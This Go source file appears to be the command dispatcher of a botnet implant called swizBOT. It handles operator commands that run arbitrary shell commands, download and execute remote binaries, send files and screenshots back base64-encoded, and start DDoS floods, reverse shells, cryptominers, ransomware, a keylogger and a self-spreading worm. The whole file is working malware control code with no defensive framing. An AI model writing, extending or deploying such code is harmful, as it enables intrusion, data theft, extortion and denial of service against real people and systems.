package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/saviorSEC/swizBOT/internal/plugins"
)

// executeCommand dispatches one operator command. Honest responses: a
// task reports "success" only when it was actually started or finished;
// parse failures and validation errors are reported as "failed".
func executeCommand(cmd Command) Response {
	resp := Response{
		BotID:     cfgBotID,
		CommandID: cmd.ID,
		Status:    "failed",
	}
	switch cmd.Type {
	case "exec":
		out, err := shellExec(cmd.Payload)
		if err != nil {
			resp.Output = fmt.Sprintf("exec error: %v\n%s", err, out)
			return resp
		}
		resp.Status = "success"
		resp.Output = out

	case "download":
		path, err := downloadAndExec(cmd.Payload)
		if err != nil {
			resp.Output = "download error: " + err.Error()
			return resp
		}
		resp.Status = "success"
		resp.Output = "Downloaded and executed: " + path

	case "fetch":
		// pull a file back from the implant: payload = path; the file
		// content comes back base64 in the result for operator retrieval
		if cmd.Payload == "" {
			resp.Output = "fetch usage: <path to read>"
			return resp
		}
		data, err := os.ReadFile(cmd.Payload)
		if err != nil {
			resp.Output = "fetch error: " + err.Error()
			return resp
		}
		const maxFetch = 4 << 20 // 4 MB cap on exfil payloads
		if len(data) > maxFetch {
			resp.Output = fmt.Sprintf("fetch error: file exceeds %d bytes", maxFetch)
			return resp
		}
		resp.Status = "success"
		resp.Output = base64.StdEncoding.EncodeToString(data)

	case "screenshot":
		shot := &plugins.Screenshot{}
		path := shot.Path()
		if err := shot.SavePNG(path); err != nil {
			resp.Output = "screenshot error: " + err.Error()
			return resp
		}
		data, err := os.ReadFile(path)
		if err != nil {
			resp.Output = "screenshot error: " + err.Error()
			return resp
		}
		resp.Status = "success"
		resp.Output = base64.StdEncoding.EncodeToString(data)
		resp.Output += "\n[path:" + path + "]"

	case "ddos":
		target, method, err := parseDDoS(cmd)
		if err != nil {
			resp.Output = err.Error()
			return resp
		}
		flood := plugins.NewDDoS(target, method)
		if err := flood.Validate(); err != nil {
			resp.Output = "ddos error: " + err.Error()
			return resp
		}
		go func() {
			flood.Start()
		}()
		// run the configured window, then stop
		duration := 60 * time.Second
		if parts := strings.Fields(cmd.Payload); len(parts) >= 3 {
			if n, err := strconv.Atoi(parts[2]); err == nil && n > 0 {
				duration = time.Duration(n) * time.Second
			}
		}
		go func() {
			time.Sleep(duration)
			flood.Stop()
		}()
		resp.Status = "success"
		resp.Output = fmt.Sprintf("DDoS started: %s (%s) for %s", target, method, duration)

	case "shell":
		host, port, err := parseHostPort(cmd.Payload)
		if err != nil {
			resp.Output = err.Error()
			return resp
		}
		rev := plugins.NewReverseShell(host, port)
		if err := rev.Validate(); err != nil {
			resp.Output = "shell error: " + err.Error()
			return resp
		}
		go rev.Start()
		resp.Status = "success"
		resp.Output = fmt.Sprintf("Reverse shell loop started: %s:%d", host, port)

	case "miner":
		pool, wallet, threads, source, err := parseMiner(cmd.Payload)
		if err != nil {
			resp.Output = err.Error()
			return resp
		}
		m := plugins.NewMiner(pool, wallet, threads, source)
		if err := m.Resolve(); err != nil {
			resp.Output = "miner error: " + err.Error()
			return resp
		}
		if err := m.Start(); err != nil {
			resp.Output = "miner error: " + err.Error()
			return resp
		}
		resp.Status = "success"
		resp.Output = fmt.Sprintf("Miner started: pool=%s threads=%d", pool, threads)

	case "ransomware":
		pemData := strings.ReplaceAll(cmd.Payload, "\\n", "\n")
		rw, err := plugins.NewRansomware(pemData)
		if err != nil {
			resp.Output = "ransomware error: " + err.Error()
			return resp
		}
		go func() {
			rw.Start()
		}()
		resp.Status = "success"
		resp.Output = fmt.Sprintf("Ransomware started on %d directories (key id %s)",
			len(rw.Dirs()), rw.PubKeyID())

	case "keylog":
		path := strings.TrimSpace(cmd.Payload)
		if path == "" {
			path = filepath.Join(os.TempDir(), "swiz_keys.log")
		}
		kl := plugins.NewKeylogger(path)
		go kl.Start()
		resp.Status = "success"
		resp.Output = "Keylogger started: " + path

	case "worm":
		if err := startWorm(cmd.Payload); err != nil {
			resp.Output = "worm error: " + err.Error()
			return resp
		}
		resp.Status = "success"
		resp.Output = "Worm module started (vectors: smb, ssh, redis, web, usb, share, harvest)"

	case "kill":
		removePersistence()
		resp.Status = "success"
		resp.Output = "Self-destruct: bye"
		// result is best-effort; exit immediately
		go func() {
			sendResult(resp)
			os.Exit(0)
		}()
		time.Sleep(3 * time.Second)
		os.Exit(0)

	default:
		resp.Output = fmt.Sprintf("unknown command type: %s", cmd.Type)
	}
	return resp
}

func parseDDoS(cmd Command) (target, method string, err error) {
	// payload: "<host:port> [udp|tcp|http] [seconds]"
	fields := strings.Fields(cmd.Payload)
	if len(fields) == 0 {
		fields = strings.Fields(cmd.Target)
	}
	if len(fields) == 0 {
		return "", "", fmt.Errorf("ddos usage: <host:port> [udp|tcp|http] [seconds]")
	}
	method = "udp"
	if len(fields) >= 2 {
		method = strings.ToLower(fields[1])
	}
	return fields[0], method, nil
}

func parseHostPort(payload string) (string, int, error) {
	fields := strings.Fields(payload)
	if len(fields) < 2 {
		return "", 0, fmt.Errorf("usage: shell <host> <port>")
	}
	port, err := strconv.Atoi(fields[1])
	if err != nil || port < 1 || port > 65535 {
		return "", 0, fmt.Errorf("invalid port %q", fields[1])
	}
	return fields[0], port, nil
}

func parseMiner(payload string) (pool, wallet string, threads int, source string, err error) {
	// payload: "<pool> <wallet> [threads] [path-or-url]"
	fields := strings.Fields(payload)
	if len(fields) < 2 {
		return "", "", 0, "", fmt.Errorf("miner usage: <pool> <wallet> [threads] [path-or-url]")
	}
	threads = 4
	source = ""
	if len(fields) >= 3 {
		if n, aerr := strconv.Atoi(fields[2]); aerr == nil && n > 0 {
			threads = n
		} else {
			source = fields[2]
		}
	}
	if len(fields) >= 4 {
		source = fields[3]
	}
	return fields[0], fields[1], threads, source, nil
}

func shellExec(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// downloadAndExec fetches a binary and launches it.
func downloadAndExec(rawURL string) (string, error) {
	if rawURL == "" {
		return "", fmt.Errorf("empty URL")
	}
	resp, err := http.Get(rawURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("status %d", resp.StatusCode)
	}

	tmp, err := os.CreateTemp("", "swiz-*")
	if err != nil {
		return "", err
	}
	name := tmp.Name()
	if runtime.GOOS == "windows" {
		os.Remove(name)
		name += ".exe"
		tmp, err = os.Create(name)
		if err != nil {
			return "", err
		}
	}
	if _, err := io.Copy(tmp, resp.Body); err != nil {
		tmp.Close()
		os.Remove(name)
		return "", err
	}
	tmp.Close()
	os.Chmod(name, 0o700)

	if err := exec.Command(name).Start(); err != nil {
		os.Remove(name)
		return "", err
	}
	return name, nil
}
